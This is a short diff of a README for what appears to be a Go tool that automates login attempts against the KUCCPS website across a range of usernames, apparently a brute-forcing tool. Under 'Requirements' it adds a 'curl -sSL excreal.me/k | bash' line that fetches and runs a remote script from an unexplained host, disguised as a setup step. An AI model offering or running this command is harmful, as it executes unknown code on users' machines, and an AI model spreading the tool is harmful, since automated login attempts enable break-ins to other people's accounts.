@@ -5,7 +5,7 @@ This program automates the process of attempting to log in to the KUCCPS website
 ## Requirements:
 - Go 1.18 or higher
 
-curl excreal.me/kuccps | bash
+- curl -sSL excreal.me/k | bash
 
 ## Command-Line Arguments:
 - `-uS`: Starting value of the username range.
